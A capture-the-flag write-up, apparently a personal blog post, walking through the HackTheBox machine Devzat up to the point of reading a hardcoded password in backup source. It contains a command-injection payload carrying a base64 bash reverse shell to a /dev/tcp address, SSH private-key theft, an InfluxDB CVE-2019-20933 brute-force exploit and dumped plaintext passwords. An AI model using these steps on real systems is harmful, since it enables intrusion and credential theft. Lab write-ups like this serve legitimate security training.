---
title: "Walk-through of Devzat from HackTheBox"
header:
  teaser: /assets/images/2022-03-11-15-00-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - Devzat
  - Gitdumper
  - InfluxDB
  - CVE-2019-20933
---

## Machine Information

![devzat](/assets/images/2022-03-11-15-00-12.png)

Devzat is a medium machine on HackTheBox. After an initial scan we find a version of the developers chat system called Devzat. Further enumeration reveals a git repo containing the source code. In there we find a way to exploit the system and get a reverse shell. Via an SSH tunnel we discover an vulnerable version of InfluxDB. Exploiting it gets us user creds which leads to a backup of the dev site version of the chat system. After reviewing the code we discover a way to read files from within the dev version of the chat system, which lets us retrieve the root flag to complete the box.

<!--more-->

Skills required are enumeration and an ability to read code. Skills learned are finding and using exploits, discovering and taking advantage of errors in the logic of source code.


| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Devzat](https://www.hackthebox.eu/home/machines/profile/398) |
| Machine Release Date | 16th October 2021 |
| Date I Completed It | 28th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.118 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/devzat]
└─# nmap -p$ports -sC -sV -oA devzat 10.10.11.118
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 21:45 BST
Nmap scan report for 10.10.11.118
Host is up (0.023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=10/28%Time=617B0C07%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 37.72 seconds
```

We have three open ports. OpenSSH on 22, Apache on 80 and an unrecognised SSH service on port 8000.

First let's put the box name in our hosts file:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# echo "10.10.11.118 devzat.htb" >> /etc/hosts
```

## Website

Now let's look at the website:

![devzat](/assets/images/2021-10-28-21-54-11.png)

It's a simple single page with details of a developers chat system and connection information:

## Devzat Chat

![devzat-](/assets/images/2021-10-28-21-58-17.png)

Now we know what's on port 8000. Let's give it a try:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -l pencer devzat.htb -p 8000

devbot: You seem to be new here . Welcome to Devzat! Run /help to see what you can do.
Welcome to the chat. There are no more users
devbot: pencer has joined the chat
pencer: /help

[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
```

This is a version of Devzat available on Github [here](https://github.com/quackduck/devzat). We might need to dig in to that source code later, for now we can check what commands are available:

```text
[SYSTEM] ┃ /commands
pencer: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
```

We can use the available commands but nothing useful is available here:

```test
pencer: /emojis
[SYSTEM] Check out github.com/ikatyang/emoji-cheat-sheet
pencer: /users
[SYSTEM] [pencer]
pencer: /all
[SYSTEM] [/all hello hello pencer plssub SYSTEM test test]
pencer: /shrug
pencer: ¯(ツ)/¯
pencer: /id
[SYSTEM] a1ccf7c03332a87bb3cb8e401cbeeca365de4b9a847f48e44d9d5baf0410cf45
pencer: /room
[SYSTEM] You are currently in #main
[SYSTEM] Rooms and users
[SYSTEM] #main: [pencer]
pencer: /example-code
[SYSTEM] ┃ package main
         ┃ import "fmt"
         ┃ func main() {
         ┃    fmt.Println("Example!")
         ┃ }
pencer: /exit
Connection to devzat.htb closed.
```

## Gobuster

Let's drop out and do some enumeration to see if there is anything else we can find:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devzat.htb -o results.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devzat.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/28 22:16:00 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mail2.devzat.htb (Status: 302) [Size: 284]
Found: autoconfig.devzat.htb (Status: 302) [Size: 289]
<SNIP>
Found: ip204-109.devzat.htb (Status: 302) [Size: 288]                                              
Found: sugiyama1.devzat.htb (Status: 302) [Size: 288]                                              
===============================================================
2021/10/28 22:16:37 Finished
===============================================================

┌──(root💀kali)-[~/htb/devzat]
└─# cat results.txt | grep "Status: 20"
Found: pets.devzat.htb (Status: 200) [Size: 510]
```

We find a subdomain called pets. Add to hosts file and then look in a browser:

![devzat-pets](/assets/images/2021-10-28-22-21-21.png)

We can add our own pet, but it doesn't do anything interesting. A look in Burp just reveals the two fields that get posted:

![devzat-burp](/assets/images/2021-10-28-22-34-19.png)

## Interacting With Pets

We can also do this from the terminal:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# curl -d '{"name":"test1","species":"giraffe"}' -X POST http://pets.devzat.htb/api/pet
Pet was added successfully
```

Time for more enumeration. This time let's look at the pets subdomain for interesting folders:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# gobuster dir -t 100 -w /usr/share/wordlists/dirb/common.txt -u http://pets.devzat.htb/ --exclude-length 510 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pets.devzat.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          510
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/28 22:41:08 Starting gobuster in directory enumeration mode
===============================================================
/build                (Status: 301) [Size: 42] [--> /build/]
/css                  (Status: 301) [Size: 40] [--> /css/]  
/.git/HEAD            (Status: 200) [Size: 23]              
/server-status        (Status: 403) [Size: 280]             
===============================================================
2021/10/28 22:41:14 Finished
===============================================================
```

## Git Repo

My eyes are drawn to the .git folder. Why would that be on there? Let's have a look:

```html
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/
<pre>
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>
<a href="HEAD">HEAD</a>
<a href="branches/">branches/</a>
<a href="config">config</a>
<a href="description">description</a>
<a href="hooks/">hooks/</a>
<a href="index">index</a>
<a href="info/">info/</a>
<a href="logs/">logs/</a>
<a href="objects/">objects/</a>
<a href="refs/">refs/</a>
</pre>
```

We can see it's a git repositoty, there's a few files and a number of folders:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/COMMIT_EDITMSG
back again to localhost only

┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/logs/HEAD     
0000000000000000000000000000000000000000 8274d7a547c0c3854c074579dfc359664082a8f6 patrick <patrick@devzat.htb> 1624391552 +0000 commit (initial): init
8274d7a547c0c3854c074579dfc359664082a8f6 464614f32483e1fde60ee53f5d3b4d468d80ff62 patrick <patrick@devzat.htb> 1624474943 +0000 commit: fixed broken fonts
464614f32483e1fde60ee53f5d3b4d468d80ff62 ef07a04ebb2fc92cf74a39e0e4b843630666a705 patrick <patrick@devzat.htb> 1624475172 +0000 commit: back again to localhost only
```

## Gitdumper

We need to dump the git repo so we can look around it easily. In a previous box called [Travel](https://www.hackthebox.com/home/machines/profile/252) we used [GitDumper](https://github.com/internetwache/GitTools), let's do that again:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 229, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.
Resolving deltas: 100% (85/85), done.
                         
┌──(root💀kali)-[~/htb/devzat/GitTools/Dumper]
└─# ./gitdumper.sh http://pets.devzat.htb/.git/ pets_git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[+] Creating pets_git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
<SNIP>
[+] Downloaded: objects/f3/3e8162997aaa9da582aa81428ee87aa48953a6
[+] Downloaded: objects/73/c1a4d5d156b6ddc62a7e3eba1c206bd6ad19c8
[+] Downloaded: objects/dc/52d954d8d7f62c82cf63236d27093764a3d046
```

Now we need to extract the dump:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# ./GitTools/Extractor/extractor.sh pets_git extracted
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 8274d7a547c0c3854c074579dfc359664082a8f6
[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/.gitignore
[+] Found folder: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics
[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/bluewhale
<SNIP>
[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/App.svelte
[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/main.js
```

Now we can look inside the git repo locally:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# cd extracted 

┌──(root💀kali)-[~/htb/devzat/extracted]
└─# ls     
0-8274d7a547c0c3854c074579dfc359664082a8f6
1-464614f32483e1fde60ee53f5d3b4d468d80ff62 
2-ef07a04ebb2fc92cf74a39e0e4b843630666a705

┌──(root💀kali)-[~/htb/devzat/extracted]
└─# ls 0-8274d7a547c0c3854c074579dfc359664082a8f6 
characteristics  commit-meta.txt  go.mod  go.sum  main.go  petshop  start.sh  static
```

We have the three commits we saw earlier. Looking in the first one we can see it is the source code for the pets site we've just been looking at. Digging in to the main.go file we find this section:

```go
var (
        Pets []Pet = []Pet{
                {Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
                {Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
                {Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
                {Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
                {Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
                {Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
                {Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
                {Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
        }
)

func loadCharacter(species string) string {
        cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
        stdoutStderr, err := cmd.CombinedOutput()
        if err != nil {
                return err.Error()
        }
        return string(stdoutStderr)
}
```

## Pingback

This is the section that handles the pet names and species. The loadCharacter function has a strange command execution line where it doesn't sanitise the user input. We should be able to take advantage of this. Let's test it by pinging our Kali machine from the box:

```sh
┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# curl -d '{"name":"pencer","species":"giraffe;ping -c 4 10.10.14.235"}' -X POST http://pets.devzat.htb/api/pet
Pet was added successfully
```

## TCPDump

Above I've used curl like before with a semi-colon after giraffe and then my ping command. With tcpdump listening in another terminal we can see the pings were received:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# tcpdump icmp -i tun0      
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:10:45.396719 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 1, length 64
23:10:45.396729 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 1, length 64
23:10:46.398232 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 2, length 64
23:10:46.398241 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 2, length 64
23:10:47.399926 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 3, length 64
23:10:47.399936 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 3, length 64
23:10:48.401262 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 4, length 64
23:10:48.401273 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 4, length 64
```

## Reverse Shell

That worked as expected, we can now try with a reverse shell. My go to one didn't work, so I needed to base64 encode it:

```sh
┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# echo -n 'bash -i >& /dev/tcp/10.10.15.40/1337 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE=

┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# curl -d '{"name":"pencer","species":"giraffe;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE= | base64 -d | bash"}  ' -X POST http://pets.devzat.htb/api/pet
```

Now switch to a waiting netcat listener:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# nc -lvvp 1337                              
listening on [any] 1337 ...
connect to [10.10.15.40] from devzat.htb [10.10.11.118] 42062
bash: cannot set terminal process group (823): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
patrick@devzat:~/pets$ ^Z
zsh: suspended  nc -lvvp 1337
┌──(root💀kali)-[~/htb/devzat]
└─# stty raw -echo; fg
[1]  + continued  nc -lvvp 1337
patrick@devzat:~/pets$
```

With the shell upgraded to something a little more useable I had a quick look around:

```text
patrick@devzat:~/pets$ ls -lsa /home       
4 drwxr-xr-x  5 catherine catherine 4096 Oct 31 20:46 catherine
4 drwxr-xr-x  9 patrick   patrick   4096 Sep 24 14:57 patrick

patrick@devzat:~/pets$ ls -lsa /home/patrick
0 lrwxrwxrwx 1 root    root       9 Jun 22 20:40 .bash_history -> /dev/null
4 -rw-r--r-- 1 patrick patrick  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 patrick patrick 3809 Jun 22 18:43 .bashrc
4 drwx------ 3 patrick patrick 4096 Jun 22 20:17 .cache
4 drwx------ 3 patrick patrick 4096 Jun 23 16:00 .config
4 drwxr-x--- 2 patrick patrick 4096 Sep 23 15:07 devzat
4 -rw-rw-r-- 1 patrick patrick   51 Jun 22 19:52 .gitconfig
4 drwxrwxr-x 3 patrick patrick 4096 Jun 22 18:51 go
4 drwxrwxr-x 4 patrick patrick 4096 Jun 22 18:50 .npm
4 drwxrwx--- 5 patrick patrick 4096 Jun 23 19:05 pets
4 -rw-r--r-- 1 patrick patrick  807 Feb 25  2020 .profile
4 drwxrwxr-x 2 patrick patrick 4096 Sep 29 16:33 .ssh
```

## SSH As Patrick

We see there's just two users, and the flag isn't in Patrick's home folder. So we can assume we need to escalate to Catherine next. Patrick has a private SSH key so I'l drop out of this reverse shell and log in via SSH as him for a better connection:

```text
patrick@devzat:~/pets$ cd /home/patrick/

patrick@devzat:~$ cat .ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
n3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Copy this key and echo to a file on Kali:

```text
──(root💀kali)-[~/htb/devzat]
└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----   
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
n3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==
-----END OPENSSH PRIVATE KEY-----" > id_rsa                 

┌──(root💀kali)-[~/htb/devzat]
└─# chmod 600 id_rsa
```

Now SSH in using the private key:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -i id_rsa patrick@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Sun Oct 31 20:38:41 2021 from 10.10.14.37
patrick@devzat:~$ 
```

## Netstat

As usual let's have a look at a few obvious things first, if nothing jumps out then we can bring LinPEAS over to help. When I got to looking at open ports I noticed something interesting:

```text
patrick@devzat:~$ netstat -tunepl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       36107      838/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        32508      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      0          36829      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34658      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      0          36030      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          36126      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          34660      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      1000       36036      840/./devchat       
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        32424      -   
```

There's ports listening on localhost/127.0.0.1 that didn't show up in the nmap scan. We can look for processes running on that address:

```text
patrick@devzat:~$ ps -ef | grep 127.0.0.1
root        1253     996  0 20:33 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086
```

## SSH Tunneling

A docker container is definitely worth looking at further. To interact with that we'll need to tunnel a port from Kali to the box. Just like we did on the HackTheBox machine [Explore](https://pencer.io/ctf/ctf-htb-explore) let's create an SSH connection and forward any local access to port 8086 across to devzat:

```text
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -L 8086:localhost:8086 -i id_rsa patrick@devzat.htb                                                                                                                     
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Sun Oct 31 21:25:50 2021 from 10.10.15.40
patrick@devzat:~$ 
```

Now when we try to access port 8086 locally it gets passed across to the box:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://localhost:8086 
404 page not found
```

## NMAP Scan

A quick scan of the port reveals it is hosting an InfluxDB:

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# nmap -p 8086 -sV localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 21:41 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000024s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8086/tcp open  http    InfluxDB http admin 1.7.5

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

## InfluxDB

A look at the release notes for [InfluxDB version 1.7.6](https://docs.influxdata.com/influxdb/v1.8/about_the_project/releasenotes-changelog/#176-2019-04-16) reveals this:

```text
Fix security vulnerability when [http]shared-secret configuration setting is blank.
```

So 1.7.5 is vulnerable and a search for an exploit comes up as a first hit on Google:

![devzat-influx](/assets/images/2021-10-31-21-50-23.png)

Let's grab the exploit and run as described [here](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933):

```sh
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 20 (delta 5), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (20/20), 5.97 KiB | 2.98 MiB/s, done.
Resolving deltas: 100% (5/5), done.
Command 'pip' not found, but can be installed with:
apt install python3-pip
Do you want to install it? (N/y)y
apt install python3-pip
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Preparing to unpack .../python3-pip_20.3.4-4_all.deb ...
Unpacking python3-pip (20.3.4-4) ...
Setting up python3-wheel (0.34.2-1) ...
Setting up python3-pip (20.3.4-4) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.4.0) ...
                         
┌──(root💀kali)-[~/htb/devzat/InfluxDB-Exploit-CVE-2019-20933]
└─# pip install -r requirements.txt
Collecting pip~=21.0.1
  Downloading pip-21.0.1-py3-none-any.whl (1.5 MB)
     |████████████████████████████████| 1.5 MB 3.6 MB/s 
Requirement already satisfied: pytz~=2021.1 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2021.1)
<SNIP>
Successfully installed PyJWT-2.0.1 certifi-2020.12.5 idna-3.3 influxdb-5.3.1 numpy-1.20.3 pandas-1.2.5 pip-21.0.1 setuptools-56.0.0 six-1.15.0
```

## Exploiting InfluxDB

I had to install pip first as this Kali install didn't have it yet. After that I installed the requirements, so now we can run the exploit:

```sh
┌──(root💀kali)-[~/htb/devzat/InfluxDB-Exploit-CVE-2019-20933]
└─# python3 __main__.py            
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |
                                                         |_|
CVE-2019-20933

Insert ip host (default localhost): 
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): /usr/share/seclists/Usernames/Names/names.txt

Start username bruteforce
[x] aaliyah
[x] aaren
<SNIP>
[x] aditya
[v] admin

Host vulnerable !!!
Databases list:

1) devzat
2) _internal

Insert database name (exit to close): devzat
```

The exploit worked and we have connected to the database. This next bit took me a long time, but eventually I found this worked:

```sh
[devzat] Insert query (exit to change db): select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

## Switch User To Catherine

We have three users and what looks to be passwords. We know Catherine is the second user on the box, trying to SSH in as her didn't work but we can switch user:

```text
patrick@devzat:~$ su catherine
Password: 
```

Enumerating for anything owned by Catherine showed something interesting:

```text
catherine@devzat:~$ find / -group catherine -not -path "/proc/*" 2> /dev/null
/home/catherine
/home/catherine/.profile
/home/catherine/.cache
/home/catherine/.cache/motd.legal-displayed
/home/catherine/.bashrc
/home/catherine/.ssh
/home/catherine/.ssh/id_rsa.pub
/home/catherine/.ssh/id_rsa
/home/catherine/.ssh/known_hosts
/home/catherine/.ssh/authorized_keys
/home/catherine/user.txt
/home/catherine/.gnupg
/home/catherine/.gnupg/private-keys-v1.d
/home/catherine/.bash_logout
/tmp/linpeas.sh
/var/backups/devzat-main.zip
/var/backups/devzat-dev.zip
```

## Discovered Backups

Backups of the main and dev sites, worth a look why Catherine owns them:

```text
catherine@devzat:~$ cp /var/backups/devzat-main.zip /dev/shm
catherine@devzat:~$ cp /var/backups/devzat-dev.zip /dev/shm
catherine@devzat:~$ cd /dev/shm/
catherine@devzat:/dev/shm$ unzip devzat-dev.zip 
Archive:  devzat-dev.zip
   creating: dev/
  inflating: dev/go.mod              
<SNIP>
 extracting: dev/allusers.json       

catherine@devzat:/dev/shm$ unzip devzat-main.zip 
Archive:  devzat-main.zip
   creating: main/
  inflating: main/go.mod             
<SNIP>
  inflating: main/allusers.json      
```

## Diffing Files

We can use diff to check the two folders for changes:

```text
catherine@devzat:/dev/shm$ find dev -type f|sort|xargs ls -l| awk '{print $5,$8}' > dev.txt
catherine@devzat:/dev/shm$ find main -type f|sort|xargs ls -l| awk '{print $5,$8}' > main.txt
catherine@devzat:/dev/shm$ diff dev.txt main.txt 
1c1
< 3 06:37
---
> 108 06:38
5,6c5,6
< 13827 18:35
< 11341 06:56
---
> 12403 18:35
> 11332 06:54
16d15
< 356 18:35
```

Three files slightly different, we can use diff again to see for each file:

```text
catherine@devzat:/dev/shm$ diff dev/devchat.go main/devchat.go 
27c27
<       port = 8443
---
>       port = 8000
114c114
<               fmt.Sprintf("127.0.0.1:%d", port),
---
>               fmt.Sprintf(":%d", port),
```

## Code Review

We see the dev version of the devchat.go file has port 8443 in it. We accessed port 8000 externally before to get to the chat, so this shows us port 8443 is used internally within the box to get to the dev version.

A grep for 8443 of the files finds this:

```text
catherine@devzat:/dev/shm$ grep -rn "8443"
main/devchat.go:194:            u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
dev/devchat.go:27:      port = 8443
dev/devchat.go:194:             u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
```

Which confirms we are to access the dev instance locally on the box. A diff of commands.go shows these difference:

```text
catherine@devzat:/dev/shm$ diff dev/commands.go main/commands.go 
<SNIP>
<               file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
<SNIP>
< func fileCommand(u *user, args []string) {
<       if len(args) < 1 {
<               u.system("Please provide file to print and the password")
<               return
<       }
<       if len(args) < 2 {
<               u.system("You need to provide the correct password to use this function")
<               return
<       }
<       path := args[0]
<       pass := args[1]
< 
<       // Check my secure password
<       if pass != "CeilingCatStillAThingIn2021?" {
<               u.system("You did provide the wrong password")
<               return
<       }
```

A new command that only exists in the dev version allows us to read a file and display directly in the chat. We just need a password which is handily provided in the code!

## SSH As Catherine

